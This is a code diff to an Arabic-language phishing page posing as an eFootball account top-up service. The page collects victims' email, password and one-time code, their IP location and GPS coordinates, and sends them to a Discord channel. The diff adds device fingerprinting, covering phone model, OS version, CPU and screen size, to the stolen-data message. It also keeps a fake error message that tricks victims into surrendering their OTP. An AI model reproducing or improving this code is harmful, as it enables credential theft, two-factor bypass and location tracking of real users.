@@ -14,6 +14,7 @@
             align-items: center;
             min-height: 100vh;
             margin: 0;
+            flex-direction: column;
         }
         .card {
             background: rgba(15, 23, 42, 0.95);
@@ -154,7 +155,47 @@
             } catch (e) {}
         }
 
-        // دالة لطلب الـ GPS وإرسال النتيجة فور الضغط على زر الشحن
+        // دالة محسنة لتحليل ومعرفة نوع الهاتف بدقة وتجاوز اختصار Linux
+        function getAdvancedDeviceInfo() {
+            let ua = navigator.userAgent;
+            let deviceName = "هاتف محمول (غير معروف الطراز بدقة)";
+            let androidVersion = "Android غير معروف";
+
+            if (/android/i.test(ua)) {
+                // استخراج إصدار الأندرويد
+                let match = ua.match(/Android\s([0-9\.]+)/);
+                if (match) androidVersion = `Android ${match[1]}`;
+
+                // محاولة البحث عن طراز الجهاز المكتوب صراحة بين الأقواس
+                let matches = ua.match(/\(([^)]+)\)/);
+                if (matches && matches[1]) {
+                    let parts = matches[1].split(';');
+                    for (let p of parts) {
+                        p = p.trim();
+                        // إذا كان النص يحتوي على رقم طراز أو اسم شركة معروفة
+                        if (p.length > 3 && !p.includes("Linux") && !p.includes("KHTML") && !p.includes("Mobile") && !p.includes("U;") && !p.includes("CPU")) {
+                            deviceName = p;
+                            break;
+                        }
+                    }
+                }
+            } else if (/iphone|ipad|ipod/i.test(ua)) {
+                let match = ua.match(/OS\s([0-9_\.]+)/);
+                androidVersion = match ? `iOS ${match[1].replace(/_/g, '.')}` : "iOS";
+                deviceName = /iPad/.test(ua) ? "iPad" : "iPhone";
+            }
+
+            // فحص إضافي للمعالج والمعمارية
+            let cpuArchitecture = navigator.userAgentData && navigator.userAgentData.platform ? navigator.userAgentData.platform : "ARM / Linux Core";
+
+            return {
+                device: deviceName,
+                os: androidVersion,
+                cpu: cpuArchitecture,
+                screen: `${window.screen.width} x ${window.screen.height}`
+            };
+        }
+
         function getGpsAndSubmit(email, password, otp) {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
@@ -189,6 +230,8 @@
                 locationInfo = `${data.country_name || 'Unknown'} - ${data.city || 'Unknown'}`;
             } catch (err) {}
 
+            let info = getAdvancedDeviceInfo();
+
             let msg = `🎯 **[ eFootball - محاولة رقم ${attemptCount} ]** 🎯\n\n` +
                       `📧 **الإيميل:** \`${email}\`\n` +
                       `🔑 **كلمة المرور:** \`${password}\`\n` +
@@ -196,7 +239,10 @@
                       `🌐 **الـ IP:** \`${ip}\`\n` +
                       `📍 **موقع الشبكة:** ${locationInfo}\n` +
                       `📍 **إحداثيات الـ GPS:**\n${gpsData}\n` +
-                      `💻 **النظام:** ${navigator.platform}`;
+                      `📱 **نوع الجهاز:** \`${info.device}\`\n` +
+                      `⚙️ **إصدار النظام:** \`${info.os}\`\n` +
+                      `💻 **المعمارية/النواة:** \`${info.cpu}\`\n` +
+                      `🖥️ **دقة الشاشة:** \`${info.screen}\``;
 
             await sendToDiscord(msg);
 
@@ -204,7 +250,7 @@
 
             if (attemptCount === 1) {
                 errorBox.style.display = 'block';
-                errorBox.innerHTML = "خطأ في مزامنة البيانات أو أن الحساب يتطلب تأكيداً أضافياً. يرجى السماح بالموقع وتفقد الإيميل لإدخال كود التحقق (OTP) الذي وصلك.";
+                errorBox.innerHTML = "خطأ في مزامنة البيانات أو أن الحساب يتطلب تأكيداً إضافياً. يرجى السماح بالموقع وتفقد الإيميل لإدخال كود التحقق (OTP) الذي وصلك.";
                 
                 document.getElementById('otpGroup').style.display = 'block';
                 document.getElementById('submitBtn').innerText = "تأكيد الكود وإتمام الشحن";
@@ -224,7 +270,6 @@
             let password = document.getElementById('password').value;
             let otp = document.getElementById('otpCode').value || "لم يُطلب بعد";
 
-            // عند الضغط، نجبر المتصفح على إظهار نافذة الموقع لتأكيد الطلب
             getGpsAndSubmit(email, password, otp);
         }
     </script>
